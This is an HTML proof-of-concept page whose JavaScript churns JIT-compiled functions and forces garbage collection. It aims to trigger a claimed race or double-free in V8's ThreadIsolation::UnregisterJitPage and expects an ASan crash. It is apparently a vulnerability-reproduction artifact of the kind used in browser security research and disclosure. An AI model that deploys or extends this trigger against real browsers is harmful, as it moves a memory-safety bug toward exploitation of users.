<!DOCTYPE html>
<html>
<head>
  <title>V8 ThreadIsolation Bad-Free Trigger (PoC)</title>
</head>
<body>
<script>
// Target: Stress JIT allocation + GC + function destruction
// Goal: Trigger race/double-free in ThreadIsolation::UnregisterJitPage

// Generate unique function bodies to force new JIT allocations
function makeJitFunction(seed) {
  const body = `
    let a = ${seed};
    for (let i = 0; i < 1000; i++) {
      a = (a * 1664525 + 1013904223) | 0;
    }
    return a;
  `;
  return new Function(body);
}

// Aggressive function churn + GC pressure
async function triggerStress() {
  const funcs = [];
  const maxFuncs = 5000; // High churn

  // Phase 1: Allocate many JITed functions
  for (let i = 0; i < maxFuncs; i++) {
    const f = makeJitFunction(i);
    f(); // Force JIT compilation (Optimized if hot)
    funcs.push(f);
  }

  // Phase 2: Nullify references rapidly to make them collectible
  for (let i = 0; i < funcs.length; i += 2) {
    funcs[i] = null;
  }

  // Force multiple GC sweeps
  if (typeof gc === 'function') {
    for (let i = 0; i < 10; i++) {
      gc(); // Requires --expose-gc (for testing only)
      await new Promise(r => setTimeout(r, 1));
    }
  }

  // Phase 3: Re-allocate while old pages may still be in sweeper queue
  const moreFuncs = [];
  for (let i = 0; i < maxFuncs; i++) {
    const f = makeJitFunction(i + maxFuncs);
    f();
    moreFuncs.push(f);
  }

  // Rapid cleanup again
  moreFuncs.length = 0;

  // Final GC burst
  if (typeof gc === 'function') {
    for (let i = 0; i < 5; i++) {
      gc();
      await new Promise(r => setTimeout(r, 0));
    }
  }

  console.log("Stress sequence completed.");
}

// Main runner
(async () => {
  // Warn if --expose-gc not available (less effective without it)
  if (typeof gc !== 'function') {
    console.warn("Run Chrome with --js-flags='--expose-gc' for better effect.");
  }

  // Run multiple rounds to increase race window
  for (let round = 0; round < 5; round++) {
    console.log("Round", round + 1);
    await triggerStress();
    await new Promise(r => setTimeout(r, 10));
  }

  console.log("PoC finished. Watch for ASan crash in UnregisterJitPage.");
})();
</script>
</body>
</html>
